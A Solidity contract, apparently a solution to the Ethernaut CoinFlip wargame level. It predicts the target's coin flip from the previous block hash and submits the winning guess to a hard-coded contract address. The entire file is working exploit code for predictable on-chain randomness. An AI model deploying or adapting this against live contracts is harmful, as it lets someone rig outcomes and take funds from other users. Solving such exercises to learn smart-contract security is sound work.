// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './openzeppelin/SafeMath.sol';

interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool) ;
}

contract AttackCoinFlip {
    
    using SafeMath for uint256;
    address coinFlipContractAddress = 0x5C674CC3FF3d6596E46e2fFFB018ED7F347e1A88;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack () public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlipInterface(coinFlipContractAddress).flip (side);
    }
}